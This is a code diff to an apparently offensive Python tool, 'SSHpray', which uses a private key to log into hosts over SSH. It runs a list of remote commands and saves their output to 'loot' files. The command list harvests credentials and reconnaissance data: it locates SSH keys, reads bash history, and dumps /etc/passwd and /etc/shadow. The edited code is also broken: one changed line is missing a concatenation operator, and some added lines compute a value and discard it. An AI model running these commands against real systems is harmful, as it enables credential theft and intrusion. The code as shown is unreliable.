@@ -40,7 +40,7 @@ class SSHpray():
         if not os.path.exists(self.loot_dir):
             os.makedirs(self.loot_dir)
         #command(s) to run
-        self.remote_commands = ['sudo locate id_rsa', 'sudo ','tail -n 50 ~/.bash_history', 'cat /etc/passwd;','sudo cat /etc/shadow;','uname -a;','w;','who -a;','last','exit']
+        self.remote_commands = ['sudo locate id_rsa','tail -n 50 ~/.bash_history', 'cat /etc/passwd;','sudo cat /etc/shadow;','uname -a;','w;','who -a;','last','exit']
 
 
     def check_args(self, parser):
@@ -147,6 +147,10 @@ class SSHpray():
         print('SSHpray started at: {}'.format(time.strftime('%d/%m/%Y - %H:%M:%S')))
     
     def connect(self):
+
+        pattern = re.compile('[\W_]+')
+        pattern.sub('', string.printable)
+
         signal.signal(signal.SIGINT, self.signal_handler)
         with open(self.args.keyfile) as f:
             private_key = f.readlines()
@@ -169,7 +173,7 @@ class SSHpray():
                         os.makedirs(self.loot_dir+'/'+str(t))
 
                     #save output to a file 
-                    with open(str(c.strip())+'_loot.txt', 'w') as loot_file:
+                    with open(self.loot_dir+'/'str(c.translate(None, '~!@#$%^&*()_+`-=[]\|/?.,<>'))+'_loot.txt', 'w') as loot_file:
                         loot_file.writelines(''.join(stdout.readlines()))
 
                     print (''.join(stdout.readlines()))
